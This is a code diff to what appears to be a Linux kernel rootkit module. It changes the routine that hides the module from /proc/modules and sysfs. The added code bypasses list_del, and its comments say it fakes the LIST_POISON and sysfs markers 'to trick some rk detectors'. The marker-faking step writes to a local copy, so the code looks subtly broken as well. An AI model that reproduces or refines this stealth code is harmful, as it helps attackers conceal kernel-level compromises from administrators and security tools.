@@ -163,7 +163,15 @@ struct rmmod_controller {
 static struct rmmod_controller rmmod_ctrl;
 static DEFINE_MUTEX(generic_mutex);
 
+static inline void ntsh_list_del(struct list_head *prev, struct list_head *next)
+{
+    next->prev = prev;
+    prev->next = next;
+}
+
 static void ntsh_hide_mod(void) {
+    struct list_head this_list;
+
     if (NULL != mod_list)
         return;
     /*
@@ -186,15 +194,38 @@ static void ntsh_hide_mod(void) {
      */
 
     // Backup and remove this module from /proc/modules
-    mod_list = lkmmod.this_mod->list.prev;
+    this_list = lkmmod.this_mod->list;
+    mod_list = this_list.prev;
     mutex_lock(&generic_mutex);
-    list_del(&(lkmmod.this_mod->list));
+
+    /**
+     * We bypass original list_del()
+     */
+    ntsh_list_del(this_list.prev, this_list.next);
+
+    /**
+     * Swap LIST_POISON in order to trick
+     * some rk detectors that will look for
+     * the markers set by list_del()
+     *
+     * It should be OK as long as you don't run
+     * list debug on this one (lib/list_debug.c)
+     */
+    this_list.next = (struct list_head*)LIST_POISON2;
+    this_list.prev = (struct list_head*)LIST_POISON1;
+
     mutex_unlock(&generic_mutex);
 
     // Backup and remove this module from sysfs
     rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
     rmmod_ctrl.parent = lkmmod.this_mod->mkobj.kobj.parent;
     kobject_del(lkmmod.this_mod->holders_dir->parent);
+
+    /**
+     * Again mess with the known marker set by
+     * kobject_del()
+     */
+    lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;
 }
 
 /*
@@ -249,6 +280,7 @@ static void ntsh_unhide_mod(void) {
 
     // Restore /proc/module entry
     mutex_lock(&generic_mutex);
+
     list_add(&(lkmmod.this_mod->list), mod_list);
     mutex_unlock(&generic_mutex);
     goto out_put_kobj;
